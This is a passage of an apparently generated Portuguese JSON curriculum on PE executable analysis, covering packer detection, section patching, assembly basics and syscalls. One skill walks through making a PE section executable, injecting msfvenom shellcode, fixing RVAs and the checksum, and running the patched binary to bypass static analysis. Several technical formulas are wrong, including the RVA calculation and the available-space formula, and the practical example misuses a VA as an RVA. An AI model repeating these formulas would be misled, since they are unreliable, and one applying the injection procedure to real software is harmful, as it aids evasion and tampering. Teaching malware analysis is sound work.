                                  "materials": "Ferramentas: CFF Explorer, PE-Bear ou biblioteca pefile (Python); Amostra PE não packed para baseline.",
                                  "tips": "Sempre valide o PE magic (0x5A4D e 0x4550) primeiro para evitar arquivos corrompidos.",
                                  "learningObjective": "Compreender a localização e extração precisa da Section Table em um executável PE.",
                                  "commonMistakes": "Ignorar o Optional Header, que pode indicar tamanhos esperados; confundir VirtualSize com RawSize inicialmente."
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Analisar Discrepâncias entre VirtualSize e RawSize nas Seções",
                                  "subSteps": [
                                    "Para cada seção, compare VirtualSize (tamanho virtual em memória) com RawSize (tamanho em disco).",
                                    "Identifique seções onde VirtualSize >> RawSize (indicando padding ou packing) ou vice-versa.",
                                    "Calcule a diferença percentual: (VirtualSize - RawSize) / RawSize * 100.",
                                    "Foquem em seções executáveis como .text ou .rdata com discrepâncias > 50%.",
                                    "Registre seções com VirtualSize = 0 mas RawSize > 0, comum em ofuscação."
                                  ],
                                  "verification": "Lista de seções com discrepâncias calculadas e destacadas, com pelo menos uma suspeita anotada.",
                                  "estimatedTime": "15-20 minutos",
                                  "materials": "Planilha ou script Python com pefile para automação de cálculos; Amostra packed (ex: UPX).",
                                  "tips": "Use scripts para automação em grandes análises; discrepâncias > 2x são altamente suspeitas.",
                                  "learningObjective": "Detectar anomalias de tamanho que sugerem compressão ou packing via comparações quantitativas.",
                                  "commonMistakes": "Desconsiderar alinhamentos padrão (0x1000 bytes); assumir todas as discrepâncias são packing sem contexto."
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Verificar Characteristics Anormais nas Seções",
                                  "subSteps": [
                                    "Examine os flags de Characteristics para cada seção (IMAGE_SCN_CNT_CODE, IMAGE_SCN_MEM_EXECUTE, etc.).",
                                    "Procure seções com flags conflitantes, como readable + writeable + executable (RWX) em excesso.",
                                    "Identifique seções sem flags esperados (ex: .text sem IMAGE_SCN_MEM_EXECUTE).",
                                    "Note seções com entropy alta (>7.5) ou nomes suspeitos (.UPX, .packed).",
                                    "Compare com baseline de PE limpo."
                                  ],
                                  "verification": "Tabela de seções com Characteristics decodificados e flags anormais destacados.",
                                  "estimatedTime": "15-20 minutos",
                                  "materials": "Ferramentas: PE Studio ou Detect It Easy (DIE); Documentação MSDN PE format.",
                                  "tips": "RWX sections são red flags em malware; use bitmasks para decodificar flags (ex: 0x20000000 para executable).",
                                  "learningObjective": "Interpretar e identificar configurações de seções que desviam do padrão PE legítimo.",
                                  "commonMistakes": "Interpretar mal os bit flags; ignorar seções overlay após o último RawSize."
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Inspecionar Data Directories e Identificar Padrões de Packers",
                                  "subSteps": [
                                    "Acesse o Data Directory array no Optional Header (18 entradas).",
                                    "Verifique entradas zeradas ou nulas (ex: Import Table RVA=0 mas funções importadas).",
                                    "Analise Export Directory e Import Directory para stubs ou redirecionamentos.",
                                    "Procure assinaturas de packers: UPX (0x55505830 em seções), ASPack (entropy baixa em .aspack).",
                                    "Correlacione com achados anteriores para confirmar packing/ofuscação."
                                  ],
                                  "verification": "Relatório listando Data Directories afetados e match com packer conhecido.",
                                  "estimatedTime": "20-25 minutos",
                                  "materials": "Banco de signatures de packers (PEiD database); Amostras conhecidas UPX/ASPacked.",
                                  "tips": "Use YARA rules para automação de detecção de packers; cheque overlay size >0.",
                                  "learningObjective": "Reconhecer padrões em Data Directories que indicam ofuscação ou packing específico.",
                                  "commonMistakes": "Confundir directories opcionais zerados com packing; não verificar checksum do PE."
                                },
                                {
                                  "stepNumber": 5,
                                  "title": "Sintetizar Evidências e Confirmar Detecção",
                                  "subSteps": [
                                    "Compile evidências: discrepâncias, flags anormais, directories zerados.",
                                    "Compare com perfis de packers (UPX: .text VirtualSize alto, dirs zerados).",
                                    "Teste unpack parcial ou execute em sandbox para validar comportamento.",
                                    "Documente relatório com screenshots e métricas.",
                                    "Sugira próximos passos: unpack com UPX -d se confirmado."
                                  ],
                                  "verification": "Relatório final com detecção confirmada (packed/ofuscado) e evidências correlacionadas.",
                                  "estimatedTime": "10-15 minutos",
                                  "materials": "Sandbox (Cuckoo); Ferramenta UPX para teste.",
                                  "tips": "Sempre priorize evidências múltiplas; false positives ocorrem em legitimate overlays.",
                                  "learningObjective": "Integrar múltiplos indicadores para uma detecção robusta de packing.",
                                  "commonMistakes": "Concluir packing baseado em um único indicador; ignorar anti-disassembly tricks."
                                }
                              ],
                              "practicalExample": "Ao analisar 'malware.exe' packed com UPX: Section .text tem VirtualSize=0x100000, RawSize=0x20000 (discrepância 5x); Characteristics RWX anormais; Import Directory RVA=0. Isso confirma UPX packing, unpackável com 'upx -d malware.exe'.",
                              "finalVerifications": [
                                "Discrepâncias >2x em pelo menos uma seção executável identificadas.",
                                "Pelo menos duas Characteristics anormais por seção suspeita.",
                                "Data Directories críticos (Import/Export) zerados ou stubbed.",
                                "Match com signature de packer conhecido (ex: UPX entropy pattern).",
                                "Overlay size >0 ou checksum PE inválido.",
                                "Comportamento em sandbox confirma loader de packer."
                              ],
                              "assessmentCriteria": [
                                "Precisão na identificação de pelo menos 80% das anomalias em amostra known-packed.",
                                "Correta interpretação de VirtualSize/RawSize e cálculo de discrepâncias.",
                                "Decodificação completa e análise de Characteristics flags.",
                                "Correlação lógica entre múltiplos indicadores sem falsos positivos.",
                                "Relatório claro com evidências visuais e recomendações.",
                                "Tempo de análise dentro do estimado com zero erros de parsing."
                              ],
                              "crossCurricularConnections": [
                                "Criptografia: Entender compressão/entropy em packers relaciona com algoritmos como LZMA.",
                                "Programação Assembly: Análise de seções requer conhecimento de x86 calling conventions em imports.",
                                "Análise de Malware: Integra com behavioral analysis e sandboxing.",
                                "Engenharia de Software: Conceitos de linking e relocation tables no PE.",
                                "Estatística: Cálculo de entropy e discrepâncias quantitativas."
                              ],
                              "realWorldApplication": "Em equipes de Threat Hunting e Incident Response, detectar packing em malware permite priorizar amostras para unpacking e análise estática, acelerando triage em incidentes como ransomware campaigns onde 70% dos samples são UPX-packed."
                            },
                            "estimatedTime": "1.5 horas",
                            "difficulty": "advanced",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "10.1.5.5.3.3",
                            "name": "Modificar seções ou diretórios para patching",
                            "description": "Alterar Characteristics de uma seção para torná-la executável, ajustar RVAs em Data Directories ou injetar shellcode em seções não usadas, recalculando checksums para manter integridade.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Analisar o arquivo PE e identificar seções adequadas para modificação",
                                  "subSteps": [
                                    "Carregue o binário PE em uma ferramenta de análise como CFF Explorer ou pefile em Python.",
                                    "Examine a tabela de seções para identificar seções não usadas ou com espaço livre (ex: .bss ou seções com características RAW).",
                                    "Anote os offsets, tamanhos, RVAs e características atuais das seções candidatas.",
                                    "Verifique os Data Directories para entender dependências (ex: Import Table RVA).",
                                    "Salve um backup do binário original."
                                  ],
                                  "verification": "Confirme que a tabela de seções está mapeada corretamente e offsets/RVAs batem com o hex dump.",
                                  "estimatedTime": "30 minutos",
                                  "materials": [
                                    "CFF Explorer ou PE-bear",
                                    "Python com biblioteca pefile",
                                    "Hex editor como HxD"
                                  ],
                                  "tips": "Use visualizadores gráficos para evitar erros manuais em hex.",
                                  "learningObjective": "Entender a estrutura da tabela de seções PE e critérios para seleção de patching.",
                                  "commonMistakes": [
                                    "Ignorar alinhamentos de seção (FileAlignment/SectionAlignment)",
                                    "Não fazer backup",
                                    "Confundir RVA com offset de arquivo"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Modificar características da seção para torná-la executável",
                                  "subSteps": [
                                    "Localize o header da seção na tabela (offset calculado: DOS Header + NT Header + número de seções * 40 bytes).",
                                    "Altere o campo Characteristics: adicione IMAGE_SCN_MEM_EXECUTE (0x20000000) e remova IMAGE_SCN_MEM_WRITE se necessário.",
                                    "Ajuste IMAGE_SCN_CNT_CODE se for código injetado.",
                                    "Salve as mudanças no arquivo.",
                                    "Valide com ferramenta se as flags foram aplicadas."
                                  ],
                                  "verification": "Ferramenta de análise mostra a seção com flags EXECUTE e CODE ativadas.",
                                  "estimatedTime": "45 minutos",
                                  "materials": [
                                    "Hex editor (HxD ou ImHex)",
                                    "CFF Explorer para validação"
                                  ],
                                  "tips": "Use little-endian para edições hex; teste em VM para segurança.",
                                  "learningObjective": "Dominar edição precisa de headers de seção PE sem corromper estrutura.",
                                  "commonMistakes": [
                                    "Endianness errada em flags",
                                    "Modificar seção errada",
                                    "Não alinhar tamanho VirtualSize"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Injetar shellcode ou patch na seção modificada",
                                  "subSteps": [
                                    "Calcule o espaço disponível: VirtualSize - PointerToRawData ajustado.",
                                    "Gere ou prepare shellcode (ex: calc.exe em assembly x86/x64).",
                                    "Escreva o shellcode no offset correto da seção usando hex editor.",
                                    "Preencha com NOPs ou zeros o resto do espaço para manter alinhamento.",
                                    "Atualize SizeOfRawData e VirtualSize se expandir."
                                  ],
                                  "verification": "Hex dump confirma shellcode no local correto sem overlaps.",
                                  "estimatedTime": "1 hora",
                                  "materials": [
                                    "Hex editor",
                                    "Metasploit ou msfvenom para shellcode",
                                    "Assembler como NASM"
                                  ],
                                  "tips": "Teste shellcode standalone em debugger antes de injetar.",
                                  "learningObjective": "Executar injeção de código em seções PE preservando integridade.",
                                  "commonMistakes": [
                                    "Overflow de seção",
                                    "Shellcode não alinhado a 16 bytes",
                                    "Esquecer null terminators"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Ajustar RVAs em Data Directories e outros pointers",
                                  "subSteps": [
                                    "Localize Optional Header Data Directories (ex: Exception Table, TLS).",
                                    "Atualize RVAs afetados pela injeção (ex: se expandiu seção, ajuste Export Table RVA).",
                                    "Verifique Import Table e relocações se impacto.",
                                    "Use script Python para automação de cálculos RVA = FileOffset - ImageBase + Section RVA.",
                                    "Salve e valide estrutura."
                                  ],
                                  "verification": "PE loader ou CFF Explorer não reporta erros em directories.",
                                  "estimatedTime": "45 minutos",
                                  "materials": [
                                    "Python com pefile",
                                    "CFF Explorer"
                                  ],
                                  "tips": "Automatize com script para evitar erros de cálculo manual.",
                                  "learningObjective": "Gerenciar dependências de RVAs em PE para patching bem-sucedido.",
                                  "commonMistakes": [
                                    "Cálculo errado de RVA (confundir com VA)",
                                    "Ignorar relocações dinâmicas",
                                    "Não atualizar SizeOfImage"
                                  ]
                                },
                                {
                                  "stepNumber": 5,
                                  "title": "Recalcular checksum e validar o binário patched",
                                  "subSteps": [
                                    "Calcule novo checksum usando algoritmo PE (somar words de 0xFFFF).",
                                    "Atualize campo CheckSum no Optional Header.",
                                    "Execute o binário em sandbox ou debugger para testar execução.",
                                    "Verifique com PE verifier se estrutura é válida.",
                                    "Compare com original usando diff tools."
                                  ],
                                  "verification": "Binário executa shellcode sem crashes; checksum matches cálculo.",
                                  "estimatedTime": "30 minutos",
                                  "materials": [
                                    "PEiD ou CFF Explorer para checksum",
                                    "x64dbg ou WinDbg",
                                    "Sandboxie"
                                  ],
                                  "tips": "Desabilite ASLR/DEP para testes iniciais.",
                                  "learningObjective": "Finalizar patch mantendo assinaturas de integridade PE.",
                                  "commonMistakes": [
                                    "Checksum incorreto (off-by-one)",
                                    "Executar sem sandbox",
                                    "Ignorar AV detection"
                                  ]
                                }
                              ],
                              "practicalExample": "Em um binário PE malicioso capturado, identifique a seção .data não usada, torne-a executável alterando flags, injete shellcode para pop calc.exe no RVA 0x401000, ajuste Import Directory RVA, recalcule checksum e execute para bypassar análise estática.",
                              "finalVerifications": [
                                "Binário carrega sem erros em PE loader.",
                                "Seção modificada tem flags corretas e contém shellcode.",
                                "Todos RVAs em Data Directories são válidos.",
                                "Checksum calculado matches header.",
                                "Shellcode executa corretamente em runtime.",
                                "Nenhuma corrupção em outras seções."
                              ],
                              "assessmentCriteria": [
                                "Precisão na edição de headers (sem bytes sobrescritos).",
                                "Correção de cálculos RVA e alinhamentos.",
                                "Funcionamento do patch sem crashes.",
                                "Validação completa de integridade PE.",
                                "Eficiência no tempo e uso de ferramentas.",
                                "Documentação clara de mudanças."
                              ],
                              "crossCurricularConnections": [
                                "Programação em Assembly (geração de shellcode).",
                                "Criptografia (algoritmo de checksum PE).",
                                "Sistemas Operacionais (carregamento PE no Windows).",
                                "Análise de Malware (técnicas de patching evasivo)."
                              ],
                              "realWorldApplication": "Usado em engenharia reversa para criar patches de software (cracks), análise de malware (desarmar payloads), desenvolvimento de exploits (injeção de ROP chains) e forense digital (modificar amostras para estudo controlado)."
                            },
                            "estimatedTime": "2.5 horas",
                            "difficulty": "advanced",
                            "status": "not_started",
                            "prerequisites": []
                          }
                        ]
                      }
                    ]
                  }
                ]
              },
              {
                "id": "10.1.6",
                "name": "Engenharia Reversa e Controle de Fluxo",
                "description": "Métodos de engenharia reversa, alteração de código e manipulação de fluxo de controle em binários.",
                "totalSkills": 44,
                "atomicTopics": [
                  {
                    "id": "10.1.6.1",
                    "name": "Desmontagem de Código Binário",
                    "description": "Processo de conversão de código máquina em linguagem assembly para análise.",
                    "individualConcepts": [
                      {
                        "id": "10.1.6.1.1",
                        "name": "Conceitos Básicos de Linguagem Assembly",
                        "description": "Entender os fundamentos da linguagem assembly em arquiteturas 32 e 64 bits, incluindo registradores, instruções básicas, chamadas de sistema e acesso a memória, como base para a desmontagem de código binário.",
                        "specificSkills": [
                          {
                            "id": "10.1.6.1.1.1",
                            "name": "Identificar diferenças entre Assembly x86 (32 bits) e x86-64",
                            "description": "Comparar registradores, tamanho de instruções, modos de endereçamento e convenções de chamada entre as arquiteturas 32 e 64 bits, reconhecendo impactos na análise de binários.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Revisar e Comparar Conjuntos de Registradores",
                                  "subSteps": [
                                    "Liste os registradores gerais de 32 bits (EAX, EBX, ECX, EDX, ESI, EDI, EBP, ESP).",
                                    "Identifique os registradores de 64 bits correspondentes (RAX, RBX, RCX, RDX, RSI, RDI, RBP, RSP).",
                                    "Estude os novos registradores adicionados no x86-64 (R8-R15).",
                                    "Compare registradores de segmento (CS, DS, etc.) e note que em x86-64 o modelo de memória plana reduz seu uso.",
                                    "Anote diferenças em flags (EFLAGS vs RFLAGS)."
                                  ],
                                  "verification": "Crie uma tabela comparativa com pelo menos 10 registradores e suas diferenças; verifique se cobre gerais, novos e flags.",
                                  "estimatedTime": "45 minutos",
                                  "materials": [
                                    "Documentação Intel x86 manuals (Vol. 1 e 2)",
                                    "Ferramenta de desmontagem como objdump ou Ghidra"
                                  ],
                                  "tips": "Use diagramas visuais para mapear registradores de 32 para 64 bits; foque em prefixos R vs E.",
                                  "learningObjective": "Entender a expansão e renomeação dos registradores entre arquiteturas.",
                                  "commonMistakes": [
                                    "Confundir registradores de 8/16 bits (AL, AX) com os de 64 bits",
                                    "Ignorar registradores adicionais R8-R15"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Analisar Diferenças em Tamanhos de Instruções e Modos de Endereçamento",
                                  "subSteps": [
                                    "Compare o tamanho máximo de instruções: 15 bytes em x86 vs até 15 bytes em x86-64 com extensões.",
                                    "Estude modos de endereçamento: x86 usa base+index+scale+displacement (32-bit); x86-64 adiciona RIP-relative.",
                                    "Examine o impacto do tamanho de ponteiros: 32-bit vs 64-bit, afetando offsets.",
                                    "Identifique instruções com encodings diferentes, como MOV com Rex prefix em x64.",
                                    "Pratique decodificando instruções simples em ambos os formatos."
                                  ],
                                  "verification": "Desmonte uma instrução MOV simples em x86 e x64 usando uma ferramenta e destaque diferenças no encoding.",
                                  "estimatedTime": "50 minutos",
                                  "materials": [
                                    "Exemplos de código assembly em NASM/GAS",
                                    "Disassembler online como Godbolt.org",
                                    "Manual de instruções Intel"
                                  ],
                                  "tips": "Use ferramentas como objdump -d para visualizar encodings hex; preste atenção ao prefixo REX em x64.",
                                  "learningObjective": "Reconhecer como modos de endereçamento evoluíram para suportar espaços de endereço maiores.",
                                  "commonMistakes": [
                                    "Assumir que RIP-relative existe em x86 32-bit",
                                    "Ignorar o overhead de 64-bit em instruções sem REX"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Estudar Convenções de Chamada de Função (Calling Conventions)",
                                  "subSteps": [
                                    "Revise x86 32-bit stdcall/cdecl: argumentos na stack, callee limpa stack.",
                                    "Aprenda x86-64 System V ABI: primeiros 6 args em RDI, RSI, RDX, RCX, R8, R9; resto na stack.",
                                    "Compare com Windows x64: RCX, RDX, R8, R9 para primeiros 4 args.",
                                    "Analise preservação de registradores: caller-saved vs callee-saved em ambas.",
                                    "Examine red zone em x86-64 Linux (128 bytes abaixo de RSP)."
                                  ],
                                  "verification": "Escreva pseudocódigo de uma chamada de função em ambas arquiteturas e liste registradores/stack usados.",
                                  "estimatedTime": "40 minutos",
                                  "materials": [
                                    "Documentação AMD64 ABI",
                                    "Exemplos de código C compilado para x86/x64 com -S flag no GCC"
                                  ],
                                  "tips": "Compile funções C simples com gcc -m32 e -m64 para observar as diferenças geradas.",
                                  "learningObjective": "Diferenciar como parâmetros são passados, impactando análise de prologs/epilogos.",
                                  "commonMistakes": [
                                    "Misturar ABIs (System V vs Microsoft)",
                                    "Esquecer shadow space em Windows x64"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Reconhecer Impactos na Análise de Binários",
                                  "subSteps": [
                                    "Discuta como diferenças afetam desmontagem: alinhamento, tamanho de binários maiores em x64.",
                                    "Analise controle de fluxo: jumps relativos em x64 usam RIP.",
                                    "Examine stack frames: RSP vs ESP, canary placements diferentes.",
                                    "Pratique identificando arquitetura em binários via 'file' ou headers PE/ELF.",
                                    "Simule análise de exploit: ROP chains mais complexas em x64 devido a mais registradores."
                                  ],
                                  "verification": "Analise um binário pequeno em x86 e x64, listando 5 impactos observados na reverse engineering.",
                                  "estimatedTime": "35 minutos",
                                  "materials": [
                                    "Binários de teste (ex: hello world em x86/x64)",
                                    "Ghidra ou IDA Free para análise"
                                  ],
                                  "tips": "Use 'readelf -h' ou 'file' para confirmar arquitetura antes de analisar.",
                                  "learningObjective": "Aplicar diferenças para análise prática de binários em segurança.",
                                  "commonMistakes": [
                                    "Analisar x64 binário com disassembler x86",
                                    "Ignorar ASLR e NX impacts ampliados em x64"
                                  ]
                                }
                              ],
                              "practicalExample": "Compile um programa C simples ('int add(int a, int b){return a+b;}') com gcc -m32 -S e gcc -m64 -S. Desmonte as funções main e add em Ghidra, comparando registradores usados para argumentos (stack em x86 vs RDI/RSI em x64), tamanhos de MOV e convenções de retorno (EAX vs RAX). Identifique RIP-relative addressing em x64.",
                              "finalVerifications": [
                                "Liste corretamente pelo menos 8 registradores novos ou expandidos em x86-64.",
                                "Explique RIP-relative addressing com um exemplo de instrução.",
                                "Descreva a ordem de registradores para os primeiros 4-6 argumentos em System V e Microsoft ABIs.",
                                "Identifique 3 diferenças em modos de endereçamento entre as arquiteturas.",
                                "Analise um binário misto e detecte se é x86 ou x64 com precisão.",
                                "Explique por que binários x64 são tipicamente maiores."
                              ],
                              "assessmentCriteria": [
                                "Precisão na identificação de registradores e suas diferenças (30%)",
                                "Compreensão de calling conventions com exemplos corretos (25%)",
                                "Análise correta de encodings e endereçamento (20%)",
                                "Aplicação prática em exemplos de binários (15%)",
                                "Tabela comparativa completa e organizada (10%)"
                              ],
                              "crossCurricularConnections": [
                                "Compiladores: Entender como otimizações geram código diferente em x86/x64.",
                                "Sistemas Operacionais: Gerenciamento de stack e syscalls variam por arquitetura.",
                                "Segurança da Informação: Impacto em exploits, ASLR e análise de malware.",
                                "Arquitetura de Computadores: Evolução de ISA e extensibilidade.",
                                "Programação de Baixo Nível: Desenvolvimento de loaders e emuladores."
                              ],
                              "realWorldApplication": "Em engenharia reversa de malware, identificar se um binário é x86 ou x64 permite aplicar o disassembler correto, analisar calling conventions para hooks de API e explorar gadgets ROP adaptados à arquitetura, essencial em CTFs, análise forense digital e desenvolvimento de ferramentas de segurança como detecção de packer."
                            },
                            "estimatedTime": "2 horas",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "10.1.6.1.1.2",
                            "name": "Reconhecer registradores e instruções comuns em Assembly",
                            "description": "Listar e descrever registradores principais (EAX, RAX, RSP etc.) e instruções básicas (MOV, ADD, JMP, CALL), explicando seu papel na manipulação de dados e controle de fluxo.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Identificar e descrever registradores principais em x86/x64 Assembly",
                                  "subSteps": [
                                    "Liste os registradores de propósito geral: RAX/EAX (acumulador), RBX/EBX (base), RCX/ECX (contador), RDX/EDX (dados).",
                                    "Descreva registradores de pilha e base: RSP/ESP (stack pointer), RBP/EBP (base pointer).",
                                    "Explique registradores de instrução: RIP/EIP (instruction pointer), flags (ZF, CF em RFLAGS/EFLAGS).",
                                    "Compare registradores 32-bit (E*) e 64-bit (R*), notando prefixos e tamanhos.",
                                    "Memorize funções primárias: acumulador para operações, contador para loops."
                                  ],
                                  "verification": "Crie uma tabela listando 8 registradores principais com suas funções e tamanhos, sem erros.",
                                  "estimatedTime": "45 minutos",
                                  "materials": [
                                    "Documentação Intel x86-64 manuals (PDF ou online)",
                                    "Ferramenta de notas como Notion ou papel"
                                  ],
                                  "tips": "Use mnemônicos: 'A para Add/Accumulate, C para Count, S para Stack'.",
                                  "learningObjective": "Reconhecer e explicar o papel de cada registrador principal em operações de CPU.",
                                  "commonMistakes": [
                                    "Confundir registradores 32-bit e 64-bit",
                                    "Esquecer registradores de flags",
                                    "Ignorar diferenças entre RSP e RBP"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Entender instruções de manipulação de dados: MOV e ADD",
                                  "subSteps": [
                                    "Analise MOV: sintaxe MOV destino, origem; copia dados sem alterar flags.",
                                    "Exemplos de MOV: MOV RAX, 10 (imediato), MOV RAX, RBX (registrador-registrador), MOV RAX, [endereço] (memória).",
                                    "Estude ADD: ADD destino, origem; soma origem a destino, atualiza flags (CF, ZF, OF).",
                                    "Exemplos de ADD: ADD EAX, 5; ADD RBX, RAX; considere overflow em operações.",
                                    "Pratique decodificando: identifique operandos e efeitos em registradores/flags."
                                  ],
                                  "verification": "Escreva 3 exemplos de MOV e ADD, explicando mudanças em registradores e flags.",
                                  "estimatedTime": "40 minutos",
                                  "materials": [
                                    "Emulador online como Godbolt Compiler Explorer com Assembly",
                                    "Livro 'Assembly Language for x86 Processors' (capítulo inicial)"
                                  ],
                                  "tips": "Lembre: MOV não afeta flags, ADD sim – teste em debugger para ver.",
                                  "learningObjective": "Diferenciar e descrever como MOV e ADD manipulam dados em registradores.",
                                  "commonMistakes": [
                                    "Pensar que MOV soma valores",
                                    "Ignorar flags em ADD",
                                    "Confundir operandos de destino/origem"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Compreender instruções de controle de fluxo: JMP e CALL",
                                  "subSteps": [
                                    "Defina JMP: salto incondicional para endereço/label, altera RIP/EIP diretamente.",
                                    "Exemplos: JMP label; JMP RAX (registrador); JMP [memória] (indireto).",
                                    "Analise CALL: chama subroutine, empilha RIP em stack (RSP--), salta para endereço.",
                                    "Diferença com JMP: CALL permite RET para voltar; JMP não salva retorno.",
                                    "Discuta impactos: JMP para loops/condicionais, CALL para funções/modularidade."
                                  ],
                                  "verification": "Desenhe fluxograma de um snippet com JMP e CALL, rotulando mudanças em RSP e RIP.",
                                  "estimatedTime": "35 minutos",
                                  "materials": [
                                    "Debugger como x64dbg ou OllyDbg (gratuito)",
                                    "Snippets de Assembly de exemplos online (ex: shellcodes simples)"
                                  ],
                                  "tips": "Visualize stack em debugger durante CALL para entender push/retorno.",
                                  "learningObjective": "Explicar como JMP e CALL controlam fluxo de execução e interagem com stack.",
                                  "commonMistakes": [
                                    "Confundir JMP com CALL (sem push)",
                                    "Esquecer decremento de RSP em CALL",
                                    "Ignorar alinhamento de endereços"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Praticar reconhecimento em código desmontado",
                                  "subSteps": [
                                    "Carregue um binário simples (ex: 'hello world' em Assembly) em disassembler.",
                                    "Identifique registradores e instruções: anote usos de RAX, MOV, ADD em funções.",
                                    "Trace controle de fluxo: marque JMP/CALL e preveja caminhos de execução.",
                                    "Analise interações: como ADD afeta flags para saltos condicionais relacionados.",
                                    "Crie resumo: liste 10 ocorrências e seus propósitos no contexto do programa."
                                  ],
                                  "verification": "Analise um snippet de 20 linhas, listando todos registradores/instruções com explicações corretas.",
                                  "estimatedTime": "50 minutos",
                                  "materials": [
                                    "Ferramenta de desmontagem: Ghidra, IDA Free ou Cutter",
                                    "Binário de teste compilado de Assembly simples"
                                  ],
                                  "tips": "Comece com código estático antes de dinâmico; pause em breakpoints para inspecionar registradores.",
                                  "learningObjective": "Aplicar conhecimento para reconhecer elementos em código real desmontado.",
                                  "commonMistakes": [
                                    "Interpretar dados como código",
                                    "Perder contexto de funções",
                                    "Não rastrear stack pointer"
                                  ]
                                }
                              ],
                              "practicalExample": "Exemplo de snippet Assembly (x64):\nmain:\n  MOV RAX, 10    ; Carrega 10 em RAX\n  ADD RAX, 5     ; Soma 5, RAX=15, atualiza flags\n  MOV RBX, hello  ; Aponta para string\n  CALL print     ; Chama função, empilha RIP\n  JMP end        ; Salta para fim\nprint:\n  ; imprime\n  RET            ; Retorna, pop RIP de RSP\nend:\nIsso demonstra MOV/ADD manipulando dados, CALL/RSP para fluxo.",
                              "finalVerifications": [
                                "Liste corretamente 8 registradores principais com funções.",
                                "Explique diferenças entre MOV e ADD, incluindo flags.",
                                "Descreva passo a passo o que CALL faz com RSP e RIP.",
                                "Analise um snippet de 10 linhas identificando todas instruções chave.",
                                "Diferencie JMP de CALL em um fluxograma.",
                                "Identifique erros comuns em um código fornecido."
                              ],
                              "assessmentCriteria": [
                                "Precisão nas descrições de registradores (nomes, funções, tamanhos).",
                                "Correta explicação de operandos e efeitos de instruções (MOV, ADD, JMP, CALL).",
                                "Compreensão de interações (flags, stack, fluxo).",
                                "Capacidade de aplicar em análise de código desmontado.",
                                "Detalhe em verificações e exemplos práticos.",
                                "Evitar confusões entre 32/64-bit ou instruções similares."
                              ],
                              "crossCurricularConnections": [
                                "Arquitetura de Computadores: Entende CPU internals e pipeline.",
                                "Programação Low-Level: Base para otimização em C/Rust.",
                                "Segurança Computacional: Essencial para análise de exploits e ROP chains.",
                                "Análise de Binários: Integra com ferramentas de RE como IDA/Ghidra.",
                                "Algoritmos: Visualiza loops e recursão em Assembly."
                              ],
                              "realWorldApplication": "Na engenharia reversa de malware, reconhecer MOV/ADD identifica manipulação de chaves criptográficas; JMP/CALL revela lógica de controle em backdoors, permitindo detecção de C2 servers ou bypass de anti-análise em binários maliciosos."
                            },
                            "estimatedTime": "1.5 horas",
                            "difficulty": "beginner",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "10.1.6.1.1.3",
                            "name": "Analisar chamadas de sistema e acesso a memória",
                            "description": "Identificar syscalls (ex: int 0x80, syscall) e padrões de acesso a memória (leitura/escrita via registradores e offsets), relacionando-os a comportamentos em código desmontado.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Compreender Conceitos Básicos de Syscalls e Acesso a Memória",
                                  "subSteps": [
                                    "Estude o que são syscalls: interfaces entre userland e kernel em sistemas como Linux.",
                                    "Aprenda convenções de chamadas: int 0x80 (x86 legacy), syscall (x64), com número da syscall em RAX/EAX.",
                                    "Revise registradores envolvidos: RAX para número da syscall, RBX/RDI para args.",
                                    "Entenda acessos a memória: instruções como MOV [reg+offset], size qualifiers (byte, word, dword).",
                                    "Diferencie leitura (load) vs escrita (store) em memória via registradores."
                                  ],
                                  "verification": "Liste 3 syscalls comuns (ex: read=0, write=1, open=2) e descreva como parâmetros são passados via registradores.",
                                  "estimatedTime": "45 minutos",
                                  "materials": [
                                    "Documentação kernel.org/syscalls",
                                    "Guia de calling convention AMD64 ABI",
                                    "Exemplos de assembly em GitHub"
                                  ],
                                  "tips": "Use diagramas de pilha/registradores para visualizar passagem de argumentos.",
                                  "learningObjective": "Dominar fundamentos de syscalls e operações de memória em assembly.",
                                  "commonMistakes": [
                                    "Confundir int 0x80 com syscall moderna",
                                    "Ignorar diferenças entre x86 e x64",
                                    "Esquecer que offsets podem ser negativos"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Identificar Syscalls em Código Desmontado",
                                  "subSteps": [
                                    "Desmonte um binário simples usando objdump ou Ghidra.",
                                    "Procure padrões: int 0x80, syscall, sysenter.",
                                    "Identifique o número da syscall em EAX/RAX imediatamente antes da invocação.",
                                    "Mapeie argumentos: trace registradores nos passos anteriores.",
                                    "Anote syscalls comuns como execve (59), socket (41)."
                                  ],
                                  "verification": "Em um snippet desmontado fornecido, destaque e nomeie pelo menos 2 syscalls corretamente.",
                                  "estimatedTime": "60 minutos",
                                  "materials": [
                                    "Ferramenta objdump ou ndisasm",
                                    "Binário de teste simples (ex: hello world com read)",
                                    "Tabela de syscalls unistd.h"
                                  ],
                                  "tips": "Filtre desmontagem por 'int 0x80' ou 'syscall' no seu editor.",
                                  "learningObjective": "Reconhecer e catalogar syscalls em binários desmontados.",
                                  "commonMistakes": [
                                    "Interpretar MOV para EAX como syscall sem int/syscall",
                                    "Não verificar se EAX foi sobrescrito antes",
                                    "Confundir syscalls com funções de libc"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Analisar Padrões de Acesso a Memória",
                                  "subSteps": [
                                    "Identifique instruções de load/store: MOV reg, [addr], MOV [addr], reg.",
